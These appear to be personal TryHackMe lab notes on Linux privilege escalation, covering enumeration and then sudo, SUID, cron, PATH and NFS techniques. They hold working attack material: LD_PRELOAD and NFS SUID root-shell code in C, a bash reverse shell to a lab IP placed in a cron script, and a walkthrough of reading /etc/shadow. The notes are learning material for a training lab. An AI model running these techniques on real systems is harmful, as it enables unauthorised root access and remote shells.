## Linux PrivEsc


Just random priv esc tryhackme notes



### Task 1: Introduction

Privilege Escalation is a journey. 

There are no silver bullets, and much depends on the specific configuration of the target system. 

The kernel version, installed applications, supported programming languages, and other users' passwords are a couple ways.



### Task 2: What is Privilege Escalation?

What does "privilege escalation" mean?

At it's core, PrivEsc is going from a lower permission account to a higher permission one. 


Why is it important?

Getting admin privileges lets you:
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence
- Change the privilege of existing users
- Execute any administrative command



### Task 3: Enumeration


#### $ hostname

The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string.

In some cases, it can provide information about the target's system role (SQL-PROD-01). 



#### $ uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.


#### $ cat /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different flavours of Linux, making it an essential tool to have in your arsenal. 


#### $ cat /etc/issue

Systems can be identified by looking the `/etc/issue` file. This usually contains some information about the operating system but can easily be changed or customized. 


#### $ ps

The `ps` command is an effective way to see the running processes on a system. 


The output of `ps` will show:
- PID : The process ID
- TTY : Terminal Type used by the user
- Time : Amount of CPU time used by the process
- CMD : The command or executable running 


`ps -A` to show all of the running processes

`ps afjx` to show in a tree format

`ps aux` to show the users



#### $ env

The `env` command will show environmental variables. 

The PATH may have a compiler or scripting language that could be used to run code on the target system. 



#### $ sudo -l

The system might give some specific sudo privileges to a user.


#### $ ls

While looking for potential priv esc vectors, remember to use `ls -las` to find hidden files.


#### $ id

The `id` command will provide a general overview of the users privileges and group memberships. 

It can also be used on other users.


#### $ cat /etc/passwd

Reading the `/etc/passwd` file is a method to discovering users on the system.

Quick one-liners

`cat /etc/passwd | cut -d ":" -f 1` - to output all users on the system
`cat /etc/passwd | grep home` - output all users with a home folder


#### $ history

Looking at earlier `history` commands can give an idea about the target system. 


#### $ ifconfig 

The target system might be pivoting onto another network. The `ifconfig` command will give information about the network interfaces. 


Also check `ip route` to see which network routes exist.



#### $  netstat

`netstat` can be used to show which ports are listening on the local machine. 


`netstat -a` shows all listening ports and established connections

`netstat -at` or `netstat -au` can also be used to list TDP or UDP protocols.

`netstat -s` lists network usage statistics by protocol

`netstat -tp` lists connections with the service name and the PID information


#### $ find

` find . -name flag1.txt 2>/dev/null `

` find /home -name flag1.txt 2>/dev/null `

` find / -type d -name config 2>/dev/null `

` find / -type f -perm 0777 2>/dev/null `

` find / -perm a=x 2>/dev/null `

` find /home -user frank 2>/dev/null `

` find / -size +100M -type f 2>/dev/null ` 

And finally the SUID one:

` find / -perm -u=s -type f 2>/dev/null `



### Task 4: Automated Enumeration Tools

LinPeas lol



### Task 5: Privilege Escalation: Kernel Exploits

This one is just dropping CVE 2015-1328, a local priv esc kernel exploit and getting a shell from that.



### Task 6: Privilege Escalation: Sudo

Remember: sudo -l and gtfobins


#### Leverage Application Functions

For example, Apache2 can use `-f` to leverage alternative configuration files.


#### Leverage LD_PRELOAD

On some systems, you may see LD_PRELOAD.

This allows any program to use shared libraries. The steps to exploit this are as follows:

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file


The following C code can be used:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```


Then `$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles`


Now we can use this shared object when launching any program our user can run with sudo. To do this, we need to run the program by specifying the LD_PRELOAD option:

`$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`



### Task 7: Privilege Escalation: SUID

Much of Linux privilege controls rely on controlling the users and files interactions. 

This is done with permissions. Files can have Read, Write, and Execute Priviliges.

These files have a `s` bit in their permission level. 

` find / -type f -perm -04000 -ls 2>/dev/null `



The lab part:

It was the base64 binary that was used to read the flag file. 




### Task 8: Capabilities 

```bash
$ getcap -r / 2>/dev/null
```


#### Remember to check for both Python 2 and Python 3

Explanation of why: Capabilities help manage privileges at a more granular level. For example, if the SOC Analyst needs to use a tool that needs to initaite a socket connection, a regular user wouldn't be able to do that. And the system administrator does not want to give this higher level of privilege. So they can change the capabilities of that specific binary file. 



Question for me, I guess: 

What is the different between SUID and Privileges?

SUID/Setuid = "set user id upon execution"

After the process is started and called, the setuid() function process UID will be changed to the same which is set for the file on the file system. 

##### Why SUID is Good:
- Easy to use
- Widely supported by all Unix-like systems
- Doesn't require and extensions
- If it is developed well, it will drop privileges by setuid(uid) immediately after it is done with privileges operations.


##### Why SUID is Bad:

SUID is like a hammer compared to a scalpel in the way it gives privileges.

- Should we trust privilege escalation to process code itself?
- Does every process require all root possibilities to perform one privileged action?


#### Capabilities

What are they?

Capability-based security refers to the principle of designing user programs such that they directly share capabilities with each other according to the principle of least privilege. 

Example 
```bash
$ grep "define *CAP" /usr/src/linux-headers-`uname -r`-common/include/uapi/linux/capability.h
#define CAP_CHOWN            0
#define CAP_DAC_OVERRIDE     1
#define CAP_DAC_READ_SEARCH  2
#define CAP_FOWNER           3
#define CAP_FSETID           4
#define CAP_KILL             5
#define CAP_SETGID           6
#define CAP_SETUID           7
#define CAP_SETPCAP          8
#define CAP_LINUX_IMMUTABLE  9
#define CAP_NET_BIND_SERVICE 10
#define CAP_NET_BROADCAST    11
#define CAP_NET_ADMIN        12
#define CAP_NET_RAW          13
#define CAP_IPC_LOCK         14
#define CAP_IPC_OWNER        15
#define CAP_SYS_MODULE       16
#define CAP_SYS_RAWIO        17
#define CAP_SYS_CHROOT       18
#define CAP_SYS_PTRACE       19
#define CAP_SYS_PACCT        20
#define CAP_SYS_ADMIN        21
#define CAP_SYS_BOOT         22
#define CAP_SYS_NICE         23
#define CAP_SYS_RESOURCE     24
#define CAP_SYS_TIME         25
#define CAP_SYS_TTY_CONFIG   26
#define CAP_MKNOD            27
#define CAP_LEASE            28
#define CAP_AUDIT_WRITE      29
#define CAP_AUDIT_CONTROL    30
#define CAP_SETFCAP          31
#define CAP_MAC_OVERRIDE     32
#define CAP_MAC_ADMIN        33
#define CAP_SYSLOG           34
#define CAP_WAKE_ALARM       35
#define CAP_BLOCK_SUSPEND    36
#define CAP_AUDIT_READ       37
(...)
```

Some of the capabilities that can be given to a binary file are shown above. 



### Task 9: PrivEsc: Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under certain conditions.


```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 ** * *root    cd / && run-parts --report /etc/cron.hourly
25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

Above is an example of a cronjob in the THM lab. It's pretty vulnerable as one of the scripts is directly run from the /home/karen/ user folder as a root user. And since this is a CTF format it runs every minute. 

```bash
$ ls -l
total 4
-rw-r--r-- 1 karen karen 77 Jun 20  2021 backup.sh

$ cat backup.sh
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*

$ 
```


As our current user, we can change and access this script. Now we can use a reverse TCP connection in the script to send a root shell back to the attacker user.


Note: 

Crontab is always worth checking as it can sometimes lead to easy PrivEsc vectors. The following scenario is not uncommon:
1. System administrator needs to run script at regular intervals
2. They create a cron job to do this
3. After a while, the script becomes useless, and they delete it
4. They do not clean the relevant cron job


Using a bash reverse shell usually the first way to go as `nc -e` may not be supported. 

```bash
$ cat antivirus.sh
#!/bin/bash

bash -i >& /dev/tcp/10.6.82.216/16667 0>&1
```



#### Task 10: PrivEsc: PATH

If a folder for your user has write permissions in the path, you could potentially hijack an application to run a script. 

A simple way to search for writeable folders is by using:

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```

Output in lab:

```bash
karen@ip-10-10-168-32:/home$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
dev
etc
home
proc
run
snap
sys
tmp
usr
var
```

Folders like `proc` and `usr` aren't actually writable so we can skip those. `tmp` is always a good option though.

```bash
karen@ip-10-10-168-32:/home$ cd /tmp
karen@ip-10-10-168-32:/tmp$ mkdir f
karen@ip-10-10-168-32:/tmp$ cd f/
karen@ip-10-10-168-32:/tmp/f$ export PATH=/tmp/f:$PATH
karen@ip-10-10-168-32:/tmp/f$ echo $PATH
/tmp/f:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
karen@ip-10-10-168-32:/tmp/f$
```


For this lab we need to use a longer string to find the folder. We can use `grep -v proc` to remove the running processes and `cut -d "/" -f 2,3` to narrow the folder down a little more.

```bash
karen@ip-10-10-168-32:/tmp/f$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

dev/char
--SNIP--
dev/zero
etc/udev
home/murdoch <--- this folder is the one of importance
run/acpid.socket
run/dbus
--SNIP--
```


```bash
karen@ip-10-10-168-32:/tmp/f$ cd /home/murdoch
karen@ip-10-10-168-32:/home/murdoch$ ls
test  thm.py
karen@ip-10-10-168-32:/home/murdoch$ cat thm.py
/usr/bin/python3

import os
import sys

try: 
        os.system("thm")
except:
        sys.exit()


karen@ip-10-10-168-32:/home/murdoch$ file test
test: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1724ca90b94176ea2eb867165e837125e8e5ca52, for GNU/Linux 3.2.0, not stripped
karen@ip-10-10-168-32:/home/murdoch$ ./test
root@ip-10-10-168-32:/home/murdoch# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-10-168-32:/home/murdoch# 
```



### Task 11: PrivEsc: NFS

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. 

Some cases will also require you using both vectors, for example finding root SSH private keys on the target system and connecting via SSH with root privileges instead of doing it locally. 


NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS installation and can be read by users. 


```bash
karen@ip-10-10-44-64:/home$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```


An important element is the `no_root_squash` option seen above. By default, NFS will change the root user to `nfsnobody` and strip and file form the OS with root privileges.

If the `no_root_squash` option is present on the writable share, we can create an executable with an SUID bit set and run it on the target system. 


We can begin by enumerating shares from the attacker machine.

```bash
[29/03/22 7:44:06] joey@blackarch:~
$ showmount -e 10.10.44.64
Export list for 10.10.44.64:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

[29/03/22 7:44:15] joey@blackarch:~
```

```bash
[29/03/22 7:47:02] joey@blackarch:~
$ sudo mount -o rw 10.10.44.64:/home/ubuntu/sharedfolder /tmp/backupfromattacker

[29/03/22 7:47:10] joey@blackarch:~
$ cd /tmp/backupfromattacker 

[29/03/22 7:47:15] joey@blackarch:/tmp/backupfromattacker
$ ls

[29/03/22 7:47:16] joey@blackarch:/tmp/backupfromattacker
```

```bash
[29/03/22 7:49:00] joey@blackarch:/tmp/backupfromattacker
$ sudo vim nfs.c

[29/03/22 7:50:06] joey@blackarch:/tmp/backupfromattacker
$ sudo cat nfs.c

int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}


[29/03/22 7:50:10] joey@blackarch:/tmp/backupfromattacker
$ sudo gcc nfs.c -o nfs -w

[29/03/22 7:51:07] joey@blackarch:/tmp/backupfromattacker
$ sudo chmod +s nfs          

[29/03/22 7:52:12] joey@blackarch:/tmp/backupfromattacker
$ ls -l nfs 
-rws--S--- 1 root root 16184 Mar 29 19:51 nfs

[29/03/22 7:52:15] joey@blackarch:/tmp/backupfromattacker

```

Okay this actually didn't work so I switched to the /tmp folder.

```bash
[29/03/22 7:54:03] joey@blackarch:~
$ mkdir /tmp/mounttmp

[29/03/22 7:54:19] joey@blackarch:~
$ sudo mount -o rw 10.10.44.64:/tmp /tmp/mounttmp  

[sudo] password for joey: 
[29/03/22 7:54:45] joey@blackarch:~
$ cd /tmp/mounttmp

[29/03/22 7:55:24] joey@blackarch:/tmp/mounttmp
$ sudo cp  /tmp/backupfromattacker/nfs .

[29/03/22 7:55:25] joey@blackarch:/tmp/mounttmp
$ ls -l nfs  
-rwx------ 1 root root 16184 Mar 29 19:55 nfs

[29/03/22 7:55:37] joey@blackarch:/tmp/mounttmp
$ sudo chmod +s nfs

[29/03/22 7:55:43] joey@blackarch:/tmp/mounttmp
$ ll nfs
total 32K
-rws--S--- 1 root root  16K Mar 29 19:55 nfs

[29/03/22 7:55:48] joey@blackarch:/tmp/mounttmp
$ sudo chmod +r nfs

[29/03/22 7:56:00] joey@blackarch:/tmp/mounttmp
$ ls -l nfs
-rws--S--- 1 root root 16184 Mar 29 19:55 nfs

[29/03/22 7:56:02] joey@blackarch:/tmp/mounttmp
$ sudo chmod 777 nfs  

[29/03/22 7:56:21] joey@blackarch:/tmp/mounttmp
$ ls -l    
total 32
-rwxrwxrwx 1 root root 16184 Mar 29 19:55 nfs

[29/03/22 7:56:25] joey@blackarch:/tmp/mounttmp
$ sudo chmod +s nfs

[29/03/22 7:56:30] joey@blackarch:/tmp/mounttmp
$ ls -l
total 32
-rwsrwsrwx 1 root root 16184 Mar 29 19:55 nfs
```

Yeah that's a lot of commands. The main thing is just to create the executable, make it 777, then make it +s. The specific code is 

```C
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

Then just `sudo gcc nfs.c -o nfs -w` 

Then on the target machine you can `./nfs` and get a privileged shell.

Remember to use the /tmp folder if you can. It's pretty much always writeable.



### Task 12: Capstone Challenge

This one was just using a base64 SUID to read /etc/shadow and this gain lateral access to a second account. 

Second account has a `find` SUID so that was easily used to get a root shell. 

LinPeas abuse for both.



